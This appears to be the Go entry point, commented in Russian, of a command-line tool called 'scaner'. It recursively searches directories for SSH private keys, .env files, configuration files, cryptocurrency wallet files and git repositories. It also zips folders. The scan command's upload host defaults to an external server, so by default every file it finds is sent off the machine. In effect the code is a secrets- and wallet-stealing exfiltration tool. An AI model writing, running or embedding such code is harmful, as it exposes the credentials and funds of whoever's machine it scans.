package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/spf13/cobra"
	"github.com/tumarsal/scaner"
	"github.com/tumarsal/scaner/archive"
	"github.com/tumarsal/scaner/secretstore"
)

var (
	// Флаги для команды scan
	scanPath  string
	outputZip string
	password  string
	verbose   bool
	host      string

	// Флаги для типов поиска
	searchSshKeys     bool
	searchEnvFiles    bool
	searchConfigFiles bool
	searchWalletFiles bool
	searchGitRepo     bool

	// Флаги для команды upload
	uploadPath      string
	uploadHost      string
	zipSizeLimit    int64
	uploadPassword  string
	uploadVerbose   bool
	uploadChunkSize int64 // размер части при выгрузке в байтах (по умолчанию 5 MB)
)

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintf(os.Stderr, "Ошибка: %v\n", err)
		os.Exit(1)
	}
}

var rootCmd = &cobra.Command{
	Use:   "scaner",
	Short: "Инструмент для поиска, архивирования и выгрузки конфиденциальных файлов",
	Long: `Scaner - инструмент для поиска и архивирования конфиденциальных файлов,
выгрузки папок на сервер.

Режимы:
  scan   — сканирование директории (SSH ключи, .env, конфиги, кошельки, git), архивирование или загрузка на сервер
  upload — упаковка папки в zip (с опциональным разбиением по размеру) и выгрузка на сервер`,
}

var scanCmd = &cobra.Command{
	Use:   "scan [путь]",
	Short: "Сканирует указанную директорию на наличие конфиденциальных файлов",
	Long: `Сканирует указанную директорию и все её поддиректории на наличие:
- SSH ключей (id_rsa, id_ed25519, etc.)
- .env файлов
- Конфигурационных файлов (config.json, settings.yml, etc.)
- Файлов электронных кошельков (wallet.dat, keystore, etc.)

Найденные файлы могут быть загружены на удаленный сервер или сохранены в локальный архив.`,
	Args: cobra.MaximumNArgs(1),
	RunE: runScan,
}

var uploadCmd = &cobra.Command{
	Use:   "upload [путь]",
	Short: "Упаковывает файл или папку в zip и выгружает на сервер",
	Long:  `Упаковывает файл или папку в zip и выгружает на сервер. Для папки при --zip-size-limit разбиение по размеру: дочерние папки — отдельные zip.`,
	Args:  cobra.MaximumNArgs(1),
	RunE:  runUpload,
}

func init() {
	rootCmd.AddCommand(scanCmd)
	rootCmd.AddCommand(uploadCmd)

	// Флаги для команды scan
	scanCmd.Flags().StringVarP(&scanPath, "path", "p", ".", "Путь к директории для сканирования")
	scanCmd.Flags().StringVarP(&outputZip, "output", "o", "", "Путь к выходному zip архиву (если не указан, архив не создается)")
	scanCmd.Flags().StringVar(&password, "password", "", "Пароль для архива (если не указан, архив создается без шифрования)")
	scanCmd.Flags().BoolVarP(&verbose, "verbose", "v", false, "Подробный вывод")
	scanCmd.Flags().StringVar(&host, "host", "https://ckptcli.smartapi.ru/", "URL сервера для загрузки файлов (если не указан, файлы не загружаются)")

	scanCmd.Flags().BoolVar(&searchSshKeys, "ssh-keys", true, "Искать SSH ключи")
	scanCmd.Flags().BoolVar(&searchEnvFiles, "env-files", true, "Искать .env файлы")
	scanCmd.Flags().BoolVar(&searchConfigFiles, "config-files", true, "Искать конфигурационные файлы")
	scanCmd.Flags().BoolVar(&searchWalletFiles, "wallet-files", true, "Искать файлы электронных кошельков")
	scanCmd.Flags().BoolVar(&searchGitRepo, "git-repo", true, "Искать git repositories")

	// Флаги для команды upload
	uploadCmd.Flags().StringVarP(&uploadPath, "path", "p", ".", "Путь к файлу или папке для выгрузки")
	uploadCmd.Flags().StringVar(&uploadHost, "host", "https://ckptcli.smartapi.ru/", "URL сервера (обязательно)")
	uploadCmd.Flags().Int64Var(&zipSizeLimit, "zip-size-limit", 1<<30, "Лимит размера zip в байтах (по умолчанию 1 ГБ); при превышении дочерние папки выгружаются отдельно")
	uploadCmd.Flags().StringVar(&uploadPassword, "password", "", "Пароль для архива (опционально)")
	uploadCmd.Flags().BoolVarP(&uploadVerbose, "verbose", "v", false, "Подробный вывод")
	uploadCmd.Flags().Int64Var(&uploadChunkSize, "chunk-size", 5*1024*1024, "Размер части выгрузки в байтах (по умолчанию 5 MB; при 413 уменьшите)")
}

func runScan(cmd *cobra.Command, args []string) error {
	// Если путь указан как аргумент, используем его
	if len(args) > 0 {
		scanPath = args[0]
	}

	// Получаем абсолютный путь
	absPath, err := filepath.Abs(scanPath)
	if err != nil {
		return fmt.Errorf("ошибка получения абсолютного пути: %w", err)
	}

	// Проверяем существование директории
	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		return fmt.Errorf("директория не существует: %s", absPath)
	}

	if verbose {
		fmt.Printf("Начинаем сканирование директории: %s\n", absPath)
		fmt.Printf("Поиск SSH ключей: %v\n", searchSshKeys)
		fmt.Printf("Поиск .env файлов: %v\n", searchEnvFiles)
		fmt.Printf("Поиск конфигурационных файлов: %v\n", searchConfigFiles)
		fmt.Printf("Поиск файлов кошельков: %v\n", searchWalletFiles)
		if host != "" {
			fmt.Printf("Загрузка на сервер: %s\n", host)
		}
		if outputZip != "" {
			fmt.Printf("Создание архива: %s\n", outputZip)
		}
	}

	// Создаем функцию обратного вызова в зависимости от режима работы
	var callback scaner.FindCallback
	var archiver *archive.ZipArchiver
	var secretStoreClient secretstore.Client

	if outputZip != "" {
		// Режим архивирования - создаем ZipArchiver (без переименования файлов в архиве)
		archiver = archive.NewZipArchiver(outputZip, password, verbose, true)
		callback = func(_ scaner.SearchItemType, filePath string) error {
			return archiver.AddFile(filePath)
		}
	} else if host != "" {
		// Режим загрузки на сервер - создаем secretstore.Client
		secretStoreClient = secretstore.NewClient(host, verbose, 0)
		callback = func(_ scaner.SearchItemType, filePath string) error {
			return secretStoreClient.UploadFolder(filePath, "")
		}
	} else {
		// Режим только поиска без обработки файлов
		callback = func(_ scaner.SearchItemType, filePath string) error {
			if verbose {
				fmt.Printf("Найден файл: %s\n", filePath)
			}
			return nil
		}
	}

	// Создаем сканер с выбранной функцией обратного вызова
	scanner := scaner.NewScaner(callback, verbose)

	// Настраиваем типы поиска по битовой маске
	var searchMask scaner.SearchItemType
	if searchSshKeys {
		searchMask |= scaner.SearchSSHKeys
	}
	if searchEnvFiles {
		searchMask |= scaner.SearchEnvFiles
	}
	if searchConfigFiles {
		searchMask |= scaner.SearchConfigFiles
	}
	if searchWalletFiles {
		searchMask |= scaner.SearchWalletFiles
	}
	if searchGitRepo {
		searchMask |= scaner.SearchGitDirectory
	}
	scanner.SetSearchTypes(searchMask)

	// Если указан пароль, устанавливаем его

	// Сканируем файлы
	if err := scanner.ScanConfigFiles(absPath); err != nil {
		return fmt.Errorf("ошибка сканирования конфигурационных файлов: %w", err)
	}

	// Если использовался архиватор, закрываем его
	if archiver != nil {
		if err := archiver.Close(); err != nil {
			return fmt.Errorf("ошибка создания архива: %w", err)
		}
		fmt.Printf("Архив успешно создан: %s\n", outputZip)
	}
	if secretStoreClient != nil {
		if err := secretStoreClient.WaitForQueueEmpty(); err != nil {
			return fmt.Errorf("выгрузка на сервер не удалась: %w", err)
		}
	}

	// Выводим статистику
	fmt.Printf("\nРезультаты сканирования:\n")
	fmt.Printf("SSH ключей найдено: %d\n", len(scanner.GetSshKeys()))
	fmt.Printf(".env файлов найдено: %d\n", len(scanner.GetEnvFiles()))
	fmt.Printf("Конфигурационных файлов найдено: %d\n", len(scanner.GetConfigFiles()))
	fmt.Printf("Файлов кошельков найдено: %d\n", len(scanner.GetWalletFiles()))

	return nil
}

func runUpload(cmd *cobra.Command, args []string) error {
	path := uploadPath
	if len(args) > 0 {
		path = args[0]
	}
	if uploadHost == "" {
		return fmt.Errorf("не указан --host")
	}

	absPath, err := filepath.Abs(path)
	if err != nil {
		return fmt.Errorf("ошибка пути: %w", err)
	}
	info, err := os.Stat(absPath)
	if err != nil {
		return fmt.Errorf("путь недоступен: %w", err)
	}

	client := secretstore.NewClient(uploadHost, uploadVerbose, uploadChunkSize)
	defer client.Close()

	// Уже zip — выгружаем как есть, без упаковки
	if !info.IsDir() && strings.EqualFold(filepath.Ext(absPath), ".zip") {
		remoteName := filepath.Base(absPath)
		if uploadVerbose {
			fmt.Printf("Выгрузка %s -> %s (zip без перепаковки)\n", absPath, remoteName)
		}
		if err := client.UploadFolder(absPath, remoteName); err != nil {
			return fmt.Errorf("выгрузка %s: %w", remoteName, err)
		}
		if err := client.WaitForQueueEmpty(); err != nil {
			return fmt.Errorf("выгрузка не удалась: %w", err)
		}
		if uploadVerbose {
			fmt.Println("Готово.")
		}
		return nil
	}

	tmpDir, err := os.MkdirTemp("", "scaner_upload_*")
	if err != nil {
		return fmt.Errorf("временная папка: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	zipManager := archive.NewZipsManager(tmpDir, uploadPassword, uploadVerbose, zipSizeLimit, true)
	if err := zipManager.ProcessOne(absPath); err != nil {
		return fmt.Errorf("ошибка постановки в очередь: %w", err)
	}
	zipManager.Close()

	for _, res := range zipManager.ArchivesWithPaths() {
		if uploadVerbose {
			fmt.Printf("Выгрузка %s -> %s\n", res.LocalPath, res.FilePath)
		}
		if err := client.UploadFolder(res.LocalPath, res.FilePath); err != nil {
			return fmt.Errorf("выгрузка %s: %w", res.FilePath, err)
		}
	}
	if err := client.WaitForQueueEmpty(); err != nil {
		return fmt.Errorf("выгрузка не удалась: %w", err)
	}
	_ = zipManager.DeleteCreatedArchives()
	if uploadVerbose {
		fmt.Println("Готово.")
	}
	return nil
}
